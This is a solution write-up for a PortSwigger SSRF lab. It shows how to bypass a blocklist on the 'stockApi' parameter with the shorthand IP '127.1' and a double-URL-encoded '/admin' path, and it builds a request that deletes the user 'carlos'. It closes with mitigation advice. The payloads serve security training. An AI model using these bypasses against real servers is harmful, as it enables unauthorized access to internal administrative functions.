# Lab 02 — SSRF with blacklist-based input filter

> **Practitioner** · [Official lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

**Entry point:** `stockApi` · **Obstacle:** a blocklist rejects `127.0.0.1`,
`localhost` and the string `admin`.

## Solution

1. Confirm the blocks: `stockApi=http://127.0.0.1/` → rejected.
2. **Bypass the host block** with alternative IP notation — `127.1` is a
   valid shorthand for `127.0.0.1`:

```
stockApi=http://127.1/
```

→ the admin panel renders (still blocked on the `/admin` string).

3. **Bypass the path block** by double-URL-encoding the `a` of `admin`:
   `a` → `%61` → `%2561`. The full deletion request:

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

The server decodes `%25` → `%`, then `%61` → `a`, resolving `/admin/delete`
while the blocklist never sees the string — lab solved.

## Mitigation

Blacklists always lose: use an allow-list of exact destinations, resolve the
host yourself and pin the IP, and normalize/decode input before checking.
